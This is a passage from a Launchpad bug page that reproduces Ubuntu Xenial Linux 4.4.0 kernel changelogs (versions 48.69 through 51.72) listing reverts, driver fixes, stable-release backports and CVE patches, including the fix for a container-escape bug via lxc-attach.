&nbsp;&nbsp;&nbsp;&nbsp;- Revert &quot;dma-mapping: introduce the DMA_ATTR_NO_WARN attribute&quot;<br />
&nbsp;&nbsp;&nbsp;&nbsp;- Revert &quot;powerpc: implement the DMA_ATTR_NO_WARN attribute&quot;<br />
&nbsp;&nbsp;&nbsp;&nbsp;- Revert &quot;nvme: use the DMA_ATTR_NO_WARN attribute&quot;</p>
<p>linux (4.4.0-50.71) xenial; urgency=low</p>
<p>&nbsp;&nbsp;[ Luis Henriques ]</p>
<p>&nbsp;&nbsp;* Release Tracking Bug<br />
&nbsp;&nbsp;&nbsp;&nbsp;- LP: <a href="/bugs/1644169" class="bug-link">#1644169</a></p>
<p>&nbsp;&nbsp;* xenial 4.4.0-49.70 kernel breaks LXD userspace (LP: <a href="/bugs/1644165" class="bug-link">#1644165</a>)<br />
&nbsp;&nbsp;&nbsp;&nbsp;- Revert &quot;UBUNTU: SAUCE: (namespace) fuse: Allow user namespace mounts by<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;default&quot;<br />
&nbsp;&nbsp;&nbsp;&nbsp;- Revert &quot;UBUNTU: SAUCE: (namespace) fs: Don&#x27;t remove suid for CAP_FSETID for<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;userns root&quot;<br />
&nbsp;&nbsp;&nbsp;&nbsp;- Revert &quot;(namespace) Revert &quot;UBUNTU: SAUCE: fs: Don&#x27;t remove suid for<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CAP_FSETID in s_user_ns&quot;&quot;<br />
&nbsp;&nbsp;&nbsp;&nbsp;- Revert &quot;UBUNTU: SAUCE: (namespace) fs: Allow superblock owner to change<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ownership of inodes&quot;<br />
&nbsp;&nbsp;&nbsp;&nbsp;- Revert &quot;(namespace) Revert &quot;UBUNTU: SAUCE: fs: Allow superblock owner to<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;change ownership of inodes with unmappable ids&quot;&quot;<br />
&nbsp;&nbsp;&nbsp;&nbsp;- Revert &quot;UBUNTU: SAUCE: (namespace) security/integrity: Harden against<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;malformed xattrs&quot;<br />
&nbsp;&nbsp;&nbsp;&nbsp;- Revert &quot;(namespace) Revert &quot;UBUNTU: SAUCE: ima/evm: Allow root in s_user_ns<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;to set xattrs&quot;&quot;<br />
&nbsp;&nbsp;&nbsp;&nbsp;- Revert &quot;(namespace) dquot: For now explicitly don&#x27;t support filesystems<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;outside of init_user_ns&quot;<br />
&nbsp;&nbsp;&nbsp;&nbsp;- Revert &quot;(namespace) quota: Handle quota data stored in s_user_ns in<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;quota_<wbr />setxquota&quot;<br />
&nbsp;&nbsp;&nbsp;&nbsp;- Revert &quot;(namespace) quota: Ensure qids map to the filesystem&quot;<br />
&nbsp;&nbsp;&nbsp;&nbsp;- Revert &quot;(namespace) Revert &quot;UBUNTU: SAUCE: quota: Convert ids relative to<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;s_user_ns&quot;&quot;<br />
&nbsp;&nbsp;&nbsp;&nbsp;- Revert &quot;(namespace) Revert &quot;UBUNTU: SAUCE: quota: Require that qids passed<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;to dqget() be valid and map into s_user_ns&quot;&quot;<br />
&nbsp;&nbsp;&nbsp;&nbsp;- Revert &quot;(namespace) vfs: Don&#x27;t create inodes with a uid or gid unknown to<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;the vfs&quot;<br />
&nbsp;&nbsp;&nbsp;&nbsp;- Revert &quot;(namespace) vfs: Don&#x27;t modify inodes with a uid or gid unknown to<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;the vfs&quot;<br />
&nbsp;&nbsp;&nbsp;&nbsp;- Revert &quot;UBUNTU: SAUCE: (namespace) fuse: Translate ids in posix acl xattrs&quot;<br />
&nbsp;&nbsp;&nbsp;&nbsp;- Revert &quot;UBUNTU: SAUCE: (namespace) posix_acl: Export<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;posix_<wbr />acl_fix_<wbr />xattr_userns(<wbr />) to modules&quot;<br />
&nbsp;&nbsp;&nbsp;&nbsp;- Revert &quot;(namespace) vfs: Verify acls are valid within superblock&#x27;s<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;s_user_ns.&quot;<br />
&nbsp;&nbsp;&nbsp;&nbsp;- Revert &quot;(namespace) Revert &quot;UBUNTU: SAUCE: fs: Update posix_acl support to<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;handle user namespace mounts&quot;&quot;<br />
&nbsp;&nbsp;&nbsp;&nbsp;- Revert &quot;(namespace) fs: Refuse uid/gid changes which don&#x27;t map into<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;s_user_ns&quot;<br />
&nbsp;&nbsp;&nbsp;&nbsp;- Revert &quot;(namespace) Revert &quot;UBUNTU: SAUCE: fs: Refuse uid/gid changes which<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;don&#x27;t map into s_user_ns&quot;&quot;<br />
&nbsp;&nbsp;&nbsp;&nbsp;- Revert &quot;(namespace) mnt: Move the FS_USERNS_MOUNT check into sget_userns&quot;</p>
<p>linux (4.4.0-49.70) xenial; urgency=low</p>
<p>&nbsp;&nbsp;[ Luis Henriques ]</p>
<p>&nbsp;&nbsp;* Release Tracking Bug<br />
&nbsp;&nbsp;&nbsp;&nbsp;- LP: <a href="/bugs/1640921" class="bug-link">#1640921</a></p>
<p>&nbsp;&nbsp;* Infiniband driver (kernel module) needed for Azure (LP: <a href="/bugs/1641139" class="bug-link">#1641139</a>)<br />
&nbsp;&nbsp;&nbsp;&nbsp;- SAUCE: RDMA Infiniband for Windows Azure<br />
&nbsp;&nbsp;&nbsp;&nbsp;- [Config] CONFIG_<wbr />HYPERV_<wbr />INFINIBAND_<wbr />ND=m<br />
&nbsp;&nbsp;&nbsp;&nbsp;- SAUCE: Makefile RDMA infiniband driver for Windows Azure<br />
&nbsp;&nbsp;&nbsp;&nbsp;- [Config] Add hv_network_<wbr />direct.<wbr />ko to generic inclusion list<br />
&nbsp;&nbsp;&nbsp;&nbsp;- SAUCE: RDMA Infiniband for Windows Azure is dependent on amd64...</p></div>
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">This bug was fixed in the package linux - 4.4.0-51.72

---------------
linux (4.4.0-51.72) xenial; urgency=low

  [ Luis Henriques ]

  * Release Tracking Bug
    - LP: #1644611

  * 4.4.0-1037-snapdragon #41: kernel panic on boot (LP: #1644596)
    - Revert "dma-mapping: introduce the DMA_ATTR_NO_WARN attribute"
    - Revert "powerpc: implement the DMA_ATTR_NO_WARN attribute"
    - Revert "nvme: use the DMA_ATTR_NO_WARN attribute"

linux (4.4.0-50.71) xenial; urgency=low

  [ Luis Henriques ]

  * Release Tracking Bug
    - LP: #1644169

  * xenial 4.4.0-49.70 kernel breaks LXD userspace (LP: #1644165)
    - Revert "UBUNTU: SAUCE: (namespace) fuse: Allow user namespace mounts by
      default"
    - Revert "UBUNTU: SAUCE: (namespace) fs: Don't remove suid for CAP_FSETID for
      userns root"
    - Revert "(namespace) Revert "UBUNTU: SAUCE: fs: Don't remove suid for
      CAP_FSETID in s_user_ns""
    - Revert "UBUNTU: SAUCE: (namespace) fs: Allow superblock owner to change
      ownership of inodes"
    - Revert "(namespace) Revert "UBUNTU: SAUCE: fs: Allow superblock owner to
      change ownership of inodes with unmappable ids""
    - Revert "UBUNTU: SAUCE: (namespace) security/integrity: Harden against
      malformed xattrs"
    - Revert "(namespace) Revert "UBUNTU: SAUCE: ima/evm: Allow root in s_user_ns
      to set xattrs""
    - Revert "(namespace) dquot: For now explicitly don't support filesystems
      outside of init_user_ns"
    - Revert "(namespace) quota: Handle quota data stored in s_user_ns in
      quota_setxquota"
    - Revert "(namespace) quota: Ensure qids map to the filesystem"
    - Revert "(namespace) Revert "UBUNTU: SAUCE: quota: Convert ids relative to
      s_user_ns""
    - Revert "(namespace) Revert "UBUNTU: SAUCE: quota: Require that qids passed
      to dqget() be valid and map into s_user_ns""
    - Revert "(namespace) vfs: Don't create inodes with a uid or gid unknown to
      the vfs"
    - Revert "(namespace) vfs: Don't modify inodes with a uid or gid unknown to
      the vfs"
    - Revert "UBUNTU: SAUCE: (namespace) fuse: Translate ids in posix acl xattrs"
    - Revert "UBUNTU: SAUCE: (namespace) posix_acl: Export
      posix_acl_fix_xattr_userns() to modules"
    - Revert "(namespace) vfs: Verify acls are valid within superblock's
      s_user_ns."
    - Revert "(namespace) Revert "UBUNTU: SAUCE: fs: Update posix_acl support to
      handle user namespace mounts""
    - Revert "(namespace) fs: Refuse uid/gid changes which don't map into
      s_user_ns"
    - Revert "(namespace) Revert "UBUNTU: SAUCE: fs: Refuse uid/gid changes which
      don't map into s_user_ns""
    - Revert "(namespace) mnt: Move the FS_USERNS_MOUNT check into sget_userns"

linux (4.4.0-49.70) xenial; urgency=low

  [ Luis Henriques ]

  * Release Tracking Bug
    - LP: #1640921

  * Infiniband driver (kernel module) needed for Azure (LP: #1641139)
    - SAUCE: RDMA Infiniband for Windows Azure
    - [Config] CONFIG_HYPERV_INFINIBAND_ND=m
    - SAUCE: Makefile RDMA infiniband driver for Windows Azure
    - [Config] Add hv_network_direct.ko to generic inclusion list
    - SAUCE: RDMA Infiniband for Windows Azure is dependent on amd64

linux (4.4.0-48.69) xenial; urgency=low

  [ Luis Henriques ]

  * Release Tracking Bug
    - LP: #1640758

  * lxc-attach to malicious container allows access to host (LP: #1639345)
    - Revert "UBUNTU: SAUCE: (noup) ptrace: being capable wrt a process requires
      mapped uids/gids"
    - (upstream) mm: Add a user_ns owner to mm_struct and fix ptrace permission
      checks

  * take 'P' command from upstream xmon (LP: #1637978)
    - powerpc/xmon: Add xmon command to dump process/task similar to ps(1)

  * zfs: importing zpool with vdev on zvol hangs kernel (LP: #1636517)
    - SAUCE: (noup) Update zfs to 0.6.5.6-0ubuntu15

  * I2C touchpad does not work on AMD platform (LP: #1612006)
    - pinctrl/amd: Configure GPIO register using BIOS settings
    - pinctrl/amd: switch to using a bool for level

  * [LTCTest] vfio_pci not loaded on Ubuntu 16.10 by default (LP: #1636733)
    - [Config] CONFIG_VFIO_PCI=y for ppc64el

  * QEMU throws failure msg while booting guest with SRIOV VF (LP: #1630554)
    - KVM: PPC: Always select KVM_VFIO, plus Makefile cleanup

  * Allow fuse user namespace mounts by default in xenial (LP: #1634964)
    - (namespace) mnt: Move the FS_USERNS_MOUNT check into sget_userns
    - (namespace) Revert "UBUNTU: SAUCE: fs: Refuse uid/gid changes which don't
      map into s_user_ns"
    - (namespace) fs: Refuse uid/gid changes which don't map into s_user_ns
    - (namespace) Revert "UBUNTU: SAUCE: fs: Update posix_acl support to handle
      user namespace mounts"
    - (namespace) vfs: Verify acls are valid within superblock's s_user_ns.
    - SAUCE: (namespace) posix_acl: Export posix_acl_fix_xattr_userns() to modules
    - SAUCE: (namespace) fuse: Translate ids in posix acl xattrs
    - (namespace) vfs: Don't modify inodes with a uid or gid unknown to the vfs
    - (namespace) vfs: Don't create inodes with a uid or gid unknown to the vfs
    - (namespace) Revert "UBUNTU: SAUCE: quota: Require that qids passed to
      dqget() be valid and map into s_user_ns"
    - (namespace) Revert "UBUNTU: SAUCE: quota: Convert ids relative to s_user_ns"
    - (namespace) quota: Ensure qids map to the filesystem
    - (namespace) quota: Handle quota data stored in s_user_ns in quota_setxquota
    - (namespace) dquot: For now explicitly don't support filesystems outside of
      init_user_ns
    - (namespace) Revert "UBUNTU: SAUCE: ima/evm: Allow root in s_user_ns to set
      xattrs"
    - SAUCE: (namespace) security/integrity: Harden against malformed xattrs
    - (namespace) Revert "UBUNTU: SAUCE: fs: Allow superblock owner to change
      ownership of inodes with unmappable ids"
    - SAUCE: (namespace) fs: Allow superblock owner to change ownership of inodes
    - (namespace) Revert "UBUNTU: SAUCE: fs: Don't remove suid for CAP_FSETID in
      s_user_ns"
    - SAUCE: (namespace) fs: Don't remove suid for CAP_FSETID for userns root
    - SAUCE: (namespace) fuse: Allow user namespace mounts by default

  * [Feature] KBL - New device ID for Kabypoint(KbP) (LP: #1591618)
    - SAUCE: mfd: lpss: Fix Intel Kaby Lake PCH-H properties

  * hio: SSD data corruption under stress test (LP: #1638700)
    - SAUCE: hio: set bi_error field to signal an I/O error on a BIO
    - SAUCE: hio: splitting bio in the entry of .make_request_fn

  * Module sha1-mb fails to load (LP: #1637165)
    - crypto: sha-mb - Fix load failure
    - crypto: mcryptd - Fix load failure

  * please include mlx5_core modules in linux-image-generic package
    (LP: #1635223)
    - [Config] Include mlx5 in main package

  * xgene i2c slimpro driver fails to load (LP: #1625232)
    - mailbox: Add support for APM X-Gene platform mailbox driver
    - mailbox/xgene-slimpro: Checking for IS_ERR instead of NULL
    - mailbox: xgene-slimpro: Fix wrong test for devm_kzalloc
    - [Config] Enabled XGENE_SLIMPRO_MBOX as a module

  * [Dell][XPS]Touchscreen fails to function after resume from s3 by Lid
    close/open (LP: #1632527)
    - gpio/pinctrl: sunxi: stop poking around in private vars
    - pinctrl: intel: Only restore pins that are used by the driver

  * Xenial update to v4.4.30 stable release (LP: #1638272)
    - Revert "x86/mm: Expand the exception table logic to allow new handling
      options"
    - Revert "fix minor infoleak in get_user_ex()"
    - Linux 4.4.30

  * Xenial update to v4.4.29 stable release (LP: #1638267)
    - drm/prime: Pass the right module owner through to dma_buf_export()
    - drm/amdgpu: fix IB alignment for UVD
    - drm/amdgpu/dce10: disable hpd on local panels
    - drm/amdgpu/dce8: disable hpd on local panels
    - drm/amdgpu/dce11: disable hpd on local panels
    - drm/amdgpu/dce11: add missing drm_mode_config_cleanup call
    - drm/amdgpu: change vblank_time's calculation method to reduce computational
      error.
    - drm/radeon: narrow asic_init for virtualization
    - drm/radeon/si/dpm: fix phase shedding setup
    - drm/radeon: change vblank_time's calculation method to reduce computational
      error.
    - drm/vmwgfx: Limit the user-space command buffer size
    - drm/i915/gen9: fix the WaWmMemoryReadLatency implementation
    - Revert "drm/i915: Check live status before reading edid"
    - drm/i915: Account for TSEG size when determining 865G stolen base
    - drm/i915: Unalias obj-&gt;phys_handle and obj-&gt;userptr
    - mm/hugetlb: fix memory offline with hugepage size &gt; memory block size
    - posix_acl: Clear SGID bit when setting file permissions
    - ipip: Properly mark ipip GRO packets as encapsulated.
    - powerpc/eeh: Null check uses of eeh_pe_bus_get
    - perf stat: Fix interval output values
    - genirq/generic_chip: Add irq_unmap callback
    - uio: fix dmem_region_start computation
    - ARM: clk-imx35: fix name for ckil clk
    - spi: spi-fsl-dspi: Drop extra spi_master_put in device remove function
    - mwifiex: correct aid value during tdls setup
    - crypto: gcm - Fix IV buffer size in crypto_gcm_setkey
    - crypto: arm/ghash-ce - add missing async import/export
    - hwrng: omap - Only fail if pm_runtime_get_sync returns &lt; 0
    - ASoC: topology: Fix error return code in soc_tplg_dapm_widget_create()
    - ASoC: dapm: Fix possible uninitialized variable in snd_soc_dapm_get_volsw()
    - ASoC: dapm: Fix value setting for _ENUM_DOUBLE MUX's second channel
    - ASoC: dapm: Fix kcontrol creation for output driver widget
    - staging: r8188eu: Fix scheduling while atomic splat
    - power: bq24257: Fix use of uninitialized pointer bq-&gt;charger
    - dmaengine: ipu: remove bogus NO_IRQ reference
    - x86/mm: Expand the exception table logic to allow new handling options
    - s390/cio: fix accidental interrupt enabling during resume
    - s390/con3270: fix use of uninitialised data
    - s390/con3270: fix insufficient space padding
    - clk: qoriq: fix a register offset error
    - clk: divider: Fix clk_divider_round_rate() to use clk_readl()
    - perf hists browser: Fix event group display
    - perf symbols: Check symbol_conf.allow_aliases for kallsyms loading too
    - perf symbols: Fixup symbol sizes before picking best ones
    - mpt3sas: Don't spam logs if logging level is 0
    - powerpc/nvram: Fix an incorrect partition merge
    - ARM: pxa: pxa_cplds: fix interrupt handling
    - Linux 4.4.29

  * KVM: PPC: Book3S HV: Migrate pinned pages out of CMA (LP: #1632045)
    - KVM: PPC: Book3S HV: Migrate pinned pages out of CMA

  * Xenial update to v4.4.28 stable release (LP: #1637510)
    - gpio: mpc8xxx: Correct irq handler function
    - mei: me: add kaby point device ids
    - regulator: tps65910: Work around silicon erratum SWCZ010
    - clk: imx6: initialize GPU clocks
    - PM / devfreq: event: remove duplicate devfreq_event_get_drvdata()
    - rtlwifi: Fix missing country code for Great Britain
    - mmc: block: don't use CMD23 with very old MMC cards
    - mmc: sdhci: cast unsigned int to unsigned long long to avoid unexpeted error
    - PCI: Mark Atheros AR9580 to avoid bus reset
    - platform: don't return 0 from platform_get_irq[_byname]() on error
    - cpufreq: intel_pstate: Fix unsafe HWP MSR access
    - parisc: Increase KERNEL_INITIAL_SIZE for 32-bit SMP kernels
    - parisc: Fix kernel memory layout regarding position of __gp
    - parisc: Increase initial kernel mapping size
    - pstore/ramoops: fixup driver removal
    - pstore/core: drop cmpxchg based updates
    - pstore/ram: Use memcpy_toio instead of memcpy
    - pstore/ram: Use memcpy_fromio() to save old buffer
    - perf intel-pt: Fix snapshot overlap detection decoder errors
    - perf intel-pt: Fix estimated timestamps for cycle-accurate mode
    - perf intel-pt: Fix MTC timestamp calculation for large MTC periods
    - dm: mark request_queue dead before destroying the DM device
    - dm: return correct error code in dm_resume()'s retry loop
    - dm mpath: check if path's request_queue is dying in activate_path()
    - dm crypt: fix crash on exit
    - powerpc/vdso64: Use double word compare on pointers
    - powerpc/powernv: Pass CPU-endian PE number to opal_pci_eeh_freeze_clear()
    - powerpc/powernv: Use CPU-endian hub diag-data type in
      pnv_eeh_get_and_dump_hub_diag()
    - powerpc/powernv: Use CPU-endian PEST in pnv_pci_dump_p7ioc_diag_data()
    - ubi: Deal with interrupted erasures in WL
    - zfcp: fix fc_host port_type with NPIV
    - zfcp: fix ELS/GS request&amp;response length for hardware data router
    - zfcp: close window with unblocked rport during rport gone
    - zfcp: retain trace level for SCSI and HBA FSF response records
    - zfcp: restore: Dont use 0 to indicate invalid LUN in rec trace
    - zfcp: trace on request for open and close of WKA port
    - zfcp: restore tracing of handle for port and LUN with HBA records
    - zfcp: fix D_ID field with actual value on tracing SAN responses
    - zfcp: fix payload trace length for SAN request&amp;response
    - zfcp: trace full payload of all SAN records (req,resp,iels)
    - scsi: zfcp: spin_lock_irqsave() is not nestable
    - fbdev/efifb: Fix 16 color palette entry calculation
    - ovl: Fix info leak in ovl_lookup_temp()
    - ovl: copy_up_xattr(): use strnlen
    - mb86a20s: fix the locking logic
    - mb86a20s: fix demod settings
    - cx231xx: don't return error on success
    - cx231xx: fix GPIOs for Pixelview SBTVD hybrid
    - ALSA: hda - Fix a failure of micmute led when having multi adcs
    - MIPS: Fix -mabi=64 build of vdso.lds
    - MIPS: ptrace: Fix regs_return_value for kernel context
    - lib: move strtobool() to kstrtobool()
    - lib: update single-char callers of strtobool()
    - lib: add "on"/"off" support to kstrtobool
    - Input: i8042 - skip selftest on ASUS laptops
    - Input: elantech - force needed quirks on Fujitsu H760
    - Input: elantech - add Fujitsu Lifebook E556 to force crc_enabled
    - sunrpc: fix write space race causing stalls
    - NFSv4: Don't report revoked delegations as valid in nfs_have_delegation()
    - NFSv4: nfs4_copy_delegation_stateid() must fail if the delegation is invalid
    - NFSv4: Open state recovery must account for file permission changes
    - NFSv4.2: Fix a reference leak in nfs42_proc_layoutstats_generic
    - scsi: Fix use-after-free
    - metag: Only define atomic_dec_if_positive conditionally
    - mm: filemap: don't plant shadow entries without radix tree node
    - ipc/sem.c: fix complex_count vs. simple op race
    - arc: don't leak bits of kernel stack into coredump
    - fs/super.c: fix race between freeze_super() and thaw_super()
    - cifs: Limit the overall credit acquired
    - fs/cifs: keep guid when assigning fid to fileinfo
    - Clarify locking of cifs file and tcon structures and make more granular
    - Display number of credits available
    - Set previous session id correctly on SMB3 reconnect
    - SMB3: GUIDs should be constructed as random but valid uuids
    - Do not send SMB3 SET_INFO request if nothing is changing
    - Cleanup missing frees on some ioctls
    - blkcg: Unlock blkcg_pol_mutex only once when cpd == NULL
    - x86/e820: Don't merge consecutive E820_PRAM ranges
    - kvm: x86: memset whole irq_eoi
    - irqchip/gicv3: Handle loop timeout proper
    - sd: Fix rw_max for devices that report an optimal xfer size
    - hpsa: correct skipping masked peripherals
    - PKCS#7: Don't require SpcSpOpusInfo in Authenticode pkcs7 signatures
    - bnx2x: Prevent false warning for lack of FC NPIV
    - net/mlx4_core: Allow resetting VF admin mac to zero
    - acpi, nfit: check for the correct event code in notifications
    - mm: workingset: fix crash in shadow node shrinker caused by
      replace_page_cache_page()
    - mm: filemap: fix mapping-&gt;nrpages double accounting in fuse
    - Using BUG_ON() as an assert() is _never_ acceptable
    - s390/mm: fix gmap tlb flush issues
    - irqchip/gic-v3-its: Fix entry size mask for GITS_BASER
    - isofs: Do not return EACCES for unknown filesystems
    - memstick: rtsx_usb_ms: Runtime resume the device when polling for cards
    - memstick: rtsx_usb_ms: Manage runtime PM when accessing the device
    - arm64: percpu: rewrite ll/sc loops in assembly
    - arm64: kernel: Init MDCR_EL2 even in the absence of a PMU
    - ceph: fix error handling in ceph_read_iter
    - powerpc/mm: Prevent unlikely crash in copro_calculate_slb()
    - mmc: core: Annotate cmd_hdr as __le32
    - mmc: rtsx_usb_sdmmc: Avoid keeping the device runtime resumed when unused
    - mmc: rtsx_usb_sdmmc: Handle runtime PM while changing the led
    - ext4: do not advertise encryption support when disabled
    - jbd2: fix incorrect unlock on j_list_lock
    - ubifs: Fix xattr_names length in exit paths
    - target: Re-add missing SCF_ACK_KREF assignment in v4.1.y
    - target: Make EXTENDED_COPY 0xe4 failure return COPY TARGET DEVICE NOT
      REACHABLE
    - target: Don't override EXTENDED_COPY xcopy_pt_cmd SCSI status code
    - Linux 4.4.28

  * Xenial update to v4.4.27 stable release (LP: #1637501)
    - serial: 8250_dw: Check the data-&gt;pclk when get apb_pclk
    - btrfs: assign error values to the correct bio structs
    - drivers: base: dma-mapping: page align the size when unmap_kernel_range
    - fuse: listxattr: verify xattr list
    - fuse: invalidate dir dentry after chmod
    - fuse: fix killing s[ug]id in setattr
    - i40e: avoid NULL pointer dereference and recursive errors on early PCI error
    - brcmfmac: fix memory leak in brcmf_fill_bss_param
    - ASoC: Intel: Atom: add a missing star in a memcpy call
    - reiserfs: Unlock superblock before calling reiserfs_quota_on_mount()
    - reiserfs: switch to generic_{get,set,remove}xattr()
    - async_pq_val: fix DMA memory leak
    - scsi: arcmsr: Simplify user_len checking
    - ext4: enforce online defrag restriction for encrypted files
    - ext4: reinforce check of i_dtime when clearing high fields of uid and gid
    - ext4: fix memory leak in ext4_insert_range()
    - ext4: allow DAX writeback for hole punch
    - ext4: release bh in make_indexed_dir
    - dlm: free workqueues after the connections
    - vfs: move permission checking into notify_change() for utimes(NULL)
    - cfq: fix starvation of asynchronous writes
    - Linux 4.4.27

  * Xenial update to v4.4.26 stable release (LP: #1637500)
    - x86/build: Build compressed x86 kernels as PIE
    - Linux 4.4.26

  * ISST-LTE:pVM nvme 0000:a0:00.0: iommu_alloc failed on NVMe card
    (LP: #1633128)
    - dma-mapping: introduce the DMA_ATTR_NO_WARN attribute
    - powerpc: implement the DMA_ATTR_NO_WARN attribute
    - nvme: use the DMA_ATTR_NO_WARN attribute

  * CVE-2016-8658
    - brcmfmac: avoid potential stack overflow in brcmf_cfg80211_start_ap()

  * Hotkey doesn't work on HP x360 (LP: #1620979)
    - gpiolib: Make it possible to exclude GPIOs from IRQ domain
    - pinctrl: cherryview: Do not mask all interrupts in probe
    - pinctrl: cherryview: Do not add all southwest and north GPIOs to IRQ domain

  * Bad page state in process genwqe_gunzip pfn:3c275 in the genwqe device
    driver (LP: #1559194)
    - SAUCE: (noup) Bad page state in process genwqe_gunzip pfn:3c275 in the
      genwqe device driver

  * CVE-2016-7425
    - scsi: arcmsr: Buffer overflow in arcmsr_iop_message_xfer()

  * Add ipvlan module to 16.04 kernel (LP: #1634705)
    - [Config] Add ipvlan to the generic inclusion list

  * kernel generates ACPI Exception: AE_NOT_FOUND, Evaluating _DOD incorrectly
    (LP: #1634607)
    - ACPI / video: skip evaluating _DOD when it does not exist

  * BT still shows off after resume by wireless hotkey (LP: #1634380)
    - Bluetooth: btusb: Fix atheros firmware download error

  * ghash-clmulni-intel module fails to load (LP: #1633058)
    - crypto: ghash-clmulni - Fix load failure
    - crypto: cryptd - Assign statesize properly

  * Xenial update to v4.4.25 stable release (LP: #1634153)
    - timekeeping: Fix __ktime_get_fast_ns() regression
    - ALSA: ali5451: Fix out-of-bound position reporting
    - ALSA: usb-audio: Extend DragonFly dB scale quirk to cover other variants
    - ALSA: usb-line6: use the same declaration as definition in header for MIDI
      manufacturer ID
    - mfd: rtsx_usb: Avoid setting ucr-&gt;current_sg.status
    - mfd: atmel-hlcdc: Do not sleep in atomic context
    - mfd: 88pm80x: Double shifting bug in suspend/resume
    - mfd: wm8350-i2c: Make sure the i2c regmap functions are compiled
    - KVM: PPC: Book3s PR: Allow access to unprivileged MMCR2 register
    - KVM: MIPS: Drop other CPU ASIDs on guest MMU changes
    - KVM: PPC: BookE: Fix a sanity check
    - x86/boot: Fix kdump, cleanup aborted E820_PRAM max_pfn manipulation
    - x86/irq: Prevent force migration of irqs which are not in the vector domain
    - x86/dumpstack: Fix x86_32 kernel_stack_pointer() previous stack access
    - ARM: dts: mvebu: armada-390: add missing compatibility string and bracket
    - ARM: dts: MSM8064 remove flags from SPMI/MPP IRQs
    - ARM: cpuidle: Fix error return code
    - ima: use file_dentry()
    - tpm: fix a race condition in tpm2_unseal_trusted()
    - tpm_crb: fix crb_req_canceled behavior
    - Linux 4.4.25

  * backport fwts UEFI test driver to Xenial (LP: #1633506)
    - efi: Add efi_test driver for exporting UEFI runtime service interfaces
    - [Config] CONFIG_EFI_TEST=m

  * Fix alps driver for multitouch function. (LP: #1633321)
    - HID: alps: fix multitouch cursor issue

  * xgene merlin crashes when running as iperf server (LP: #1632739)
    - drivers: net: xgene: optimizing the code
    - xgene: get_phy_device() doesn't return NULL anymore
    - drivers: net: xgene: Get channel number from device binding
    - drivers: net: xgene: constify xgene_cle_ops structure
    - drivers: net: xgene: Fix error handling
    - drivers: net: xgene: fix IPv4 forward crash
    - drivers: net: xgene: fix sharing of irqs
    - drivers: net: xgene: fix ununiform latency across queues
    - drivers: net: xgene: fix statistics counters race condition
    - drivers: net: xgene: fix register offset
    - drivers: net: xgene: Separate set_speed from mac_init
    - drivers: net: xgene: Fix module unload crash - hw resource cleanup
    - drivers: net: xgene: Fix module unload crash - change sw sequence
    - drivers: net: xgene: Fix module unload crash - clkrst sequence
    - drivers: net: phy: xgene: Add MDIO driver
    - drivers: net: xgene: Add backward compatibility
    - drivers: net: xgene: Enable MDIO driver
    - drivers: net: xgene: Use exported functions
    - drivers: net: xgene: ethtool: Use phy_ethtool_gset and sset
    - dtb: xgene: Add MDIO node
    - MAINTAINERS: xgene: Add driver and documentation path
    - [Config] Enable MDIO_XGENE as a modules

  * Add support for KabeLake i219-LOM chips (LP: #1632578)
    - e1000e: Initial support for KabeLake

 -- Luis Henriques &lt;luis.henriques@canonical.com&gt;  Thu, 24 Nov 2016 17:56:21 +0000</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in linux (Ubuntu Xenial): </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        Fix Committed &#8594; Fix Released
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1639345/comments/65" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~janitor" class="sprite person-inactive">Launchpad Janitor (janitor)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-11-30T02:05:55.925033+00:00" title="2016-11-30 02:05:55 UTC">on 2016-11-30</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1639345/comments/65"> #65</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  <a href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1639345/comments/65/+download">Download full text</a> (26.6 KiB)
  <div class="editable-message-body">
